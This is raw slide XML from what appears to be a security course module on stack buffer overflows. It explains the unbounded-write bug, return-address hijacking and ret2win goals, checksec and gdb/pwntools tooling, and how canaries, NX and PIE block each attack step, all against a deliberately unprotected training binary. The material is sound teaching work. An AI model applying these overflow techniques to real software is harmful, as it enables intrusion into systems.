        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="178308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Locate a target function's address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="211226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Use pwntools' ELF module to read a symbol's address directly from a binary.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="2697480"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="61264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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="265176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Build and fire a working ret2win exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="298094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Construct a payload that overwrites a return address and redirects execution.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="3566160"/>
            <a:ext cx="457200" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2740"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22D3EE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="61264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06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="352044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Explain why each protection exists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="384962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Connect stack canaries, NX, and PIE directly to the specific step of the attack each one blocks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1">
            <a:alphaModFix amt="20000"/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10454335" y="5303520"/>
            <a:ext cx="1188720" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 2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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 2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The Vulnerability: An Unbounded Write</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The setup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fixed-size local buffer — say, char buffer[64] — sits on the stack, right next to other important data: the saved base pointer and the return address.</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The bug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function like read(0, buffer, 200) accepts up to 200 bytes into a buffer that can only safely hold 64 — with no check in between.</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What actually happens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The extra bytes don't vanish. They keep writing, overwriting whatever sits next in memory — including that saved return address.</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Why the return address matters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When the function ends, the CPU jumps to whatever address it finds there. If you controlled those bytes, you control where execution goes next.</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The One-Sentence Version</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A buffer overflow doesn't create new capabilities — it hijacks a jump the program was already about to make.</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8 · Phase 3: Gaining Access</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F172A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="640080"/>
            <a:ext cx="32004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TOOL 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2377440"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3886200"/>
            <a:ext cx="3383280" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>checksec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4846320"/>
            <a:ext cx="3383280" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Know what you're up against before you write a single byte of exploit.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="82296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WHAT IT IS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1188720"/>
            <a:ext cx="6858000" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>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A utility (bundled with pwntools) that inspects a binary and reports which memory protections are enabled: stack canaries, NX (non-executable stack), PIE (position-independent executable), and RELRO.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="342900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WHEN TO USE IT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3794760"/>
            <a:ext cx="6858000" cy="237744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The very first thing you do with any binary before attempting an exploit</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Deciding which technique is even possible given the protections present</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Confirming a deliberately unprotected training binary matches what a lesson expects</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Comparing a hardened production binary against this week's intentionally weakened one</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12"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CHECKSEC · READING A BINARY'S DEFENSES</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What's Actually Protecting This Program?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2341245"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2343"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F59E0B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1426464" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10B981"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="10332720" cy="1701165"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ pwn checksec ./vuln</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Arch:       amd64-64-little</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Stack:      No canary found</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NX:         NX unknown - GNU_STACK missing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PIE:        No PIE (0x400000)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Stack:      Executable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4124325"/>
            <a:ext cx="10881360" cy="2093595"/>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No stack canary means an overflow can silently overwrite the return address, undetected</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No PIE means the binary always loads at the exact same address, every single run</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This training binary is deliberately compiled with protections off — a hardened target would show all three enabled</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10"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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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What Each Protection Actually Stops</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Stack canary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secret value placed between the buffer and the return address. If an overflow corrupts it, the program detects the change and aborts before returning.</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NX (non-executable stack)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Marks the stack as data-only — code injected there simply cannot be executed, which is why classic "shellcode on the stack" attacks stopped working.</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PIE (position-independent executable)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Loads the binary at a randomized base address every run, so a hardcoded address in an exploit is only correct by chance.</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Today, all three are off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Deliberately, so the underlying mechanism is visible without extra techniques needed to defeat modern protections.</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Certification Framing</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If a question describes a protection and asks what it defends against, match it to the exact step above — canary vs. detection, NX vs. execution, PIE vs. addressing.</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8 · Phase 3: Gaining Access</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F172A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="640080"/>
            <a:ext cx="32004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TOOL 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="preencoded.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2377440"/>
            <a:ext cx="1371600" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3886200"/>
            <a:ext cx="3383280" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>gdb + pwntools</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4846320"/>
            <a:ext cx="3383280" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Debugging the crash, and finding exactly where to aim.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="82296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WHAT IT IS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="1188720"/>
            <a:ext cx="6858000" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>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gdb is the standard Linux debugger — here used to crash the program under controlled conditions and inspect memory afterward. pwntools' cyclic pattern generator and ELF module turn "where exactly is the return address" from a guessing game into a precise, repeatable answer.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="342900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WHEN TO USE IT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="3794760"/>
            <a:ext cx="6858000" cy="237744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Generating a unique cyclic pattern to send as test input</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Crashing the program under gdb and inspecting the corrupted stack</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Looking up the exact offset a cyclic pattern reveals</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Reading a target function's address directly from the binary's symbol table</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11"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8 · Phase 3: Gaining Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12"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GDB &amp; PWNTOOLS · FINDING THE EXACT OFFSET</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A Unique Pattern, Not a Guess</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1508760"/>
            <a:ext cx="10881360" cy="2867501"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0B1220"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF4444"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1170432" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F59E0B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1426464" y="1709928"/>
            <a:ext cx="146304" cy="146304"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="10B981"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2011680"/>
            <a:ext cx="10332720" cy="2227421"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
